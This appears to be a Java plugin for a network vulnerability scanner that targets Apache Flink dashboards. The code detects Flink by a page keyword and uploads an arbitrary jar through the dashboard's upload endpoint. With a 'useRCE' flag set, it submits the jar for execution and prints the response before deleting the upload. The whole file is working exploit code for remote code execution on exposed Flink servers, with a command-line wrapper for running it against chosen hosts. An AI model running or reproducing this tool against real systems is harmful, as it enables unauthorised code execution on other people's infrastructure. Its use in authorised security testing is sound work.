package com.gbw.scanner.plugins.scripts.web.flink;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.plugins.scripts.GBWScanScriptTool;
import com.gbw.scanner.sink.SinkQueue;
import com.gbw.scanner.utils.HttpUtils;
import com.google.gson.Gson;
import com.xmap.api.utils.TextUtils;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Options;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;

public class GBWScanFlinkScript implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanFlinkScript.class);

    private GBWScanFlinkScriptConfig config;

    public GBWScanFlinkScript(GBWScanFlinkScriptConfig config){

        this.config = config;
    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }

    private boolean isFlink(Host host, CloseableHttpClient httpClient) {

        HttpGet request = FlinkHttpRequestBuilder.makeFirstPageRequest(host,config);

        GBWHttpResponse response = HttpUtils.send(httpClient,request,true);

        String content = response.getContent();

        if(TextUtils.isEmpty(content))
            return false;

        return content.contains(config.getKeywords());
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        HttpUriRequest httpRequest;
        GBWHttpResponse httpResponse;
        String content;
        Gson gson = new Gson();

        CloseableHttpClient httpClient = null;


        UPloadStatus uPloadStatus;
        String upFileName = null;

        try {

            httpClient = GBWHttpClientBuilder.make(host.getProto(),host.getPort());

            if(isFlink(host,httpClient)){

                log.info(String.format("Find a apache flink ip:%s:%d",host.getIp(),host.getPort()));

                // try to upload jar
                httpRequest = FlinkHttpRequestBuilder.makeUPloadJarRequest(host,config);

                httpResponse = HttpUtils.send(httpClient,httpRequest,true);
                if(httpResponse.getStatus() == 200){

                    content = httpResponse.getContent();
                    uPloadStatus = gson.fromJson(content,UPloadStatus.class);

                    upFileName = uPloadStatus.getFile();

                    if(!TextUtils.isEmpty(upFileName)){

                        /*find a bug*/
                        if(sinkQueue == null)
                            System.out.println(String.format("Find a apache flink upload bug,ip:%s:%d,jar:%s",host.getIp(),host.getPort(),upFileName));

                        log.warn(String.format("Find a apache flink upload bug,ip:%s:%d,jar:%s",host.getIp(),host.getPort(),upFileName));

                        if(sinkQueue!=null) {
                            GBWScanFlinkScriptResult result = new GBWScanFlinkScriptResult(config, host);
                            result.setPayload(uPloadStatus.getFilename());
                            sinkQueue.put(result);
                        }

                        /*exe rce*/
                        if(config.isUseRCE()){

                            httpRequest = FlinkHttpRequestBuilder.makesubmitJarRequest(host,config,upFileName);

                            httpResponse = HttpUtils.send(httpClient,httpRequest,true);

                            if(sinkQueue == null) {
                                System.out.println(String.format("Exe a apache flink rce ip:%s:%d,jar:%s,res:%s", host.getIp(),
                                        host.getPort(), upFileName, httpResponse.getContent()));
                            }

                            log.warn(String.format("Exe a apache flink rce ip:%s:%d,jar:%s,res:%s",host.getIp(),
                                    host.getPort(),upFileName,httpResponse.getContent()));

                        }

                        /*delete jar file*/
                        log.warn(String.format("Delete upload for IP:%s,jar:%s",host.getIp(),upFileName));

                        httpRequest = FlinkHttpRequestBuilder.makeDeleteJarRequest(host,config,upFileName);
                        HttpUtils.send(httpClient,httpRequest);
                    }
                }

            }

        }catch (Exception e){
            System.out.println(String.format("scan Flink jar file upload to IP:%s:%d,error:%s",host.getIp(),host.getPort(),e.getMessage()));

            //e.printStackTrace();
        }finally {

            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

    }

    public static void main(String[] args) throws Exception {

        GBWScanFlinkScriptConfig config = new GBWScanFlinkScriptConfig();
        GBWScanFlinkScript scanFlinkScript = new GBWScanFlinkScript(config);
        Options opts = new Options();
        String keywords = "Apache Flink Web Dashboard";
        String jarFile;
        String entryClass;
        boolean useRCE = false;

        opts.addOption("keywords",true,"apache flink keywords");
        opts.addOption("jarFile",true,"jar file path,will be upload");
        opts.addOption("entryClass",true,"jar file main class");
        opts.addOption("useRCE",false,"will run jar or not");

        GBWScanScriptTool tool = new GBWScanScriptTool(args,scanFlinkScript,opts,8081);

        CommandLine cli = tool.getCliParser();
        if(!cli.hasOption("jarFile")){
            System.out.println("Must specify upload jar File!");
            System.exit(-1);
        }
        jarFile = cli.getOptionValue("jarFile");

        if(!cli.hasOption("entryClass")){
            System.out.println("Must specify upload jar class!");
            System.exit(-1);
        }
        entryClass = cli.getOptionValue("entryClass");

        if(cli.hasOption("keywords")){
            keywords = cli.getOptionValue("keywords");
        }
        if(cli.hasOption("useRCE")){
            useRCE = true;
        }

        config.setKeywords(keywords);
        config.setJarFile(jarFile);
        config.setEntryClass(entryClass);
        config.setUseRCE(useRCE);

        String sjson = String.format(" {\"entryClass\":\"%s\",\"parallelism\":null,\"programArgs\":null,\"savepointPath\":null,\"allowNonRestoredState\":null}",entryClass);

        config.setSubmitJson(sjson);

        tool.start();
    }
}
